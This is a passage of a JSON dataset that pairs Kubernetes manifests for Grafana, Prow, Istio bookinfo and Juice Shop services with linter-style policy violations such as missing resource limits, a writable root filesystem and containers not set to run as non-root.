    "manifest_path": "data/manifests/the_stack_sample/sample_4499.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: grafana\nspec:\n  selector:\n    app: grafana\n  type: NodePort\n  ports:\n  - protocol: TCP\n    port: 3000\n    targetPort: 3000\n    nodePort: 31001\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:grafana])"
  },
  {
    "id": "11671",
    "manifest_path": "data/manifests/the_stack_sample/sample_4501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20211025-f6fa76bf58\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prow-controller-manager\" does not have a read-only root file system"
  },
  {
    "id": "11672",
    "manifest_path": "data/manifests/the_stack_sample/sample_4501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20211025-f6fa76bf58\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-controller-manager\" not found"
  },
  {
    "id": "11673",
    "manifest_path": "data/manifests/the_stack_sample/sample_4501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20211025-f6fa76bf58\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "11674",
    "manifest_path": "data/manifests/the_stack_sample/sample_4501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20211025-f6fa76bf58\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prow-controller-manager\" has cpu request 0"
  },
  {
    "id": "11675",
    "manifest_path": "data/manifests/the_stack_sample/sample_4501.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20211025-f6fa76bf58\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prow-controller-manager\" has memory limit 0"
  },
  {
    "id": "11676",
    "manifest_path": "data/manifests/the_stack_sample/sample_4508.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    prometheus.io/scrape: 'true'\n    prometheus.io/port: '8443'\n    prometheus.io/scheme: https\n  labels:\n    control-plane: controller-manager\n  name: controller-manager-metrics-service\n  namespace: system\nspec:\n  ports:\n  - name: https\n    port: 8443\n    targetPort: https\n  selector:\n    control-plane: controller-manager\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[control-plane:controller-manager])"
  },
  {
    "id": "11677",
    "manifest_path": "data/manifests/the_stack_sample/sample_4509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      serviceAccountName: bookinfo-reviews\n      containers:\n      - name: reviews\n        image: docker.io/istio/examples-bookinfo-reviews-v3:1.15.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: LOG_DIR\n          value: /tmp/logs\n        ports:\n        - containerPort: 9080\n        volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: wlp-output\n          mountPath: /opt/ibm/wlp/output\n      volumes:\n      - name: wlp-output\n        emptyDir: {}\n      - name: tmp\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reviews\" does not have a read-only root file system"
  },
  {
    "id": "11678",
    "manifest_path": "data/manifests/the_stack_sample/sample_4509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      serviceAccountName: bookinfo-reviews\n      containers:\n      - name: reviews\n        image: docker.io/istio/examples-bookinfo-reviews-v3:1.15.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: LOG_DIR\n          value: /tmp/logs\n        ports:\n        - containerPort: 9080\n        volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: wlp-output\n          mountPath: /opt/ibm/wlp/output\n      volumes:\n      - name: wlp-output\n        emptyDir: {}\n      - name: tmp\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"bookinfo-reviews\" not found"
  },
  {
    "id": "11679",
    "manifest_path": "data/manifests/the_stack_sample/sample_4509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      serviceAccountName: bookinfo-reviews\n      containers:\n      - name: reviews\n        image: docker.io/istio/examples-bookinfo-reviews-v3:1.15.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: LOG_DIR\n          value: /tmp/logs\n        ports:\n        - containerPort: 9080\n        volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: wlp-output\n          mountPath: /opt/ibm/wlp/output\n      volumes:\n      - name: wlp-output\n        emptyDir: {}\n      - name: tmp\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reviews\" is not set to runAsNonRoot"
  },
  {
    "id": "11680",
    "manifest_path": "data/manifests/the_stack_sample/sample_4509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      serviceAccountName: bookinfo-reviews\n      containers:\n      - name: reviews\n        image: docker.io/istio/examples-bookinfo-reviews-v3:1.15.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: LOG_DIR\n          value: /tmp/logs\n        ports:\n        - containerPort: 9080\n        volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: wlp-output\n          mountPath: /opt/ibm/wlp/output\n      volumes:\n      - name: wlp-output\n        emptyDir: {}\n      - name: tmp\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"reviews\" has cpu request 0"
  },
  {
    "id": "11681",
    "manifest_path": "data/manifests/the_stack_sample/sample_4509.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: reviews\n  labels:\n    app: reviews\n    version: v3\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: reviews\n  template:\n    metadata:\n      labels:\n        app: reviews\n        version: v3\n    spec:\n      serviceAccountName: bookinfo-reviews\n      containers:\n      - name: reviews\n        image: docker.io/istio/examples-bookinfo-reviews-v3:1.15.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: LOG_DIR\n          value: /tmp/logs\n        ports:\n        - containerPort: 9080\n        volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: wlp-output\n          mountPath: /opt/ibm/wlp/output\n      volumes:\n      - name: wlp-output\n        emptyDir: {}\n      - name: tmp\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"reviews\" has memory limit 0"
  },
  {
    "id": "11682",
    "manifest_path": "data/manifests/the_stack_sample/sample_4511.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: owasp-juiceshop\n    cis.f5.com/as3-tenant: AS3\n    cis.f5.com/as3-app: owasp-juiceshop\n    cis.f5.com/as3-pool: juiceshop_pool\n  name: owasp-juiceshop\nspec:\n  ports:\n  - name: owasp-juiceshop\n    port: 3000\n    protocol: TCP\n    targetPort: 3000\n  selector:\n    app: owasp-juiceshop\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:owasp-juiceshop])"
  },
  {
    "id": "11683",
    "manifest_path": "data/manifests/the_stack_sample/sample_4513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: time-check\n  namespace: dvl1987\nspec:\n  volumes:\n  - name: config-volume\n    configMap:\n      name: time-check\n  containers:\n  - name: test-container\n    image: k8s.gcr.io/busybox\n    command:\n    - /bin/sh\n    - -c\n    - 'while true; do date; sleep $TIME_FREQ;done >> /opt/time/time-check.log '\n    volumeMounts:\n    - name: config-volume\n      mountPath: /opt/time\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"test-container\" is using an invalid container image, \"k8s.gcr.io/busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11684",
    "manifest_path": "data/manifests/the_stack_sample/sample_4513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: time-check\n  namespace: dvl1987\nspec:\n  volumes:\n  - name: config-volume\n    configMap:\n      name: time-check\n  containers:\n  - name: test-container\n    image: k8s.gcr.io/busybox\n    command:\n    - /bin/sh\n    - -c\n    - 'while true; do date; sleep $TIME_FREQ;done >> /opt/time/time-check.log '\n    volumeMounts:\n    - name: config-volume\n      mountPath: /opt/time\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"test-container\" does not have a read-only root file system"
  },
  {
    "id": "11685",
    "manifest_path": "data/manifests/the_stack_sample/sample_4513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: time-check\n  namespace: dvl1987\nspec:\n  volumes:\n  - name: config-volume\n    configMap:\n      name: time-check\n  containers:\n  - name: test-container\n    image: k8s.gcr.io/busybox\n    command:\n    - /bin/sh\n    - -c\n    - 'while true; do date; sleep $TIME_FREQ;done >> /opt/time/time-check.log '\n    volumeMounts:\n    - name: config-volume\n      mountPath: /opt/time\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"test-container\" is not set to runAsNonRoot"
  },
  {
    "id": "11686",
    "manifest_path": "data/manifests/the_stack_sample/sample_4513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: time-check\n  namespace: dvl1987\nspec:\n  volumes:\n  - name: config-volume\n    configMap:\n      name: time-check\n  containers:\n  - name: test-container\n    image: k8s.gcr.io/busybox\n    command:\n    - /bin/sh\n    - -c\n    - 'while true; do date; sleep $TIME_FREQ;done >> /opt/time/time-check.log '\n    volumeMounts:\n    - name: config-volume\n      mountPath: /opt/time\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"test-container\" has cpu request 0"
  },
  {
    "id": "11687",
    "manifest_path": "data/manifests/the_stack_sample/sample_4513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: time-check\n  namespace: dvl1987\nspec:\n  volumes:\n  - name: config-volume\n    configMap:\n      name: time-check\n  containers:\n  - name: test-container\n    image: k8s.gcr.io/busybox\n    command:\n    - /bin/sh\n    - -c\n    - 'while true; do date; sleep $TIME_FREQ;done >> /opt/time/time-check.log '\n    volumeMounts:\n    - name: config-volume\n      mountPath: /opt/time\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"test-container\" has memory limit 0"
  },
  {
    "id": "11688",
    "manifest_path": "data/manifests/the_stack_sample/sample_4515.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11689",
    "manifest_path": "data/manifests/the_stack_sample/sample_4515.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11690",
    "manifest_path": "data/manifests/the_stack_sample/sample_4515.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "11691",
    "manifest_path": "data/manifests/the_stack_sample/sample_4515.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "11692",
    "manifest_path": "data/manifests/the_stack_sample/sample_4515.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"deck\" is not set to runAsNonRoot"
  },
  {
    "id": "11693",
    "manifest_path": "data/manifests/the_stack_sample/sample_4515.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20190808-9137ac3e9\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"deck\" has cpu request 0"
  },
  {
    "id": "11694",
    "manifest_path": "data/manifests/the_stack_sample/sample_4515.yaml",
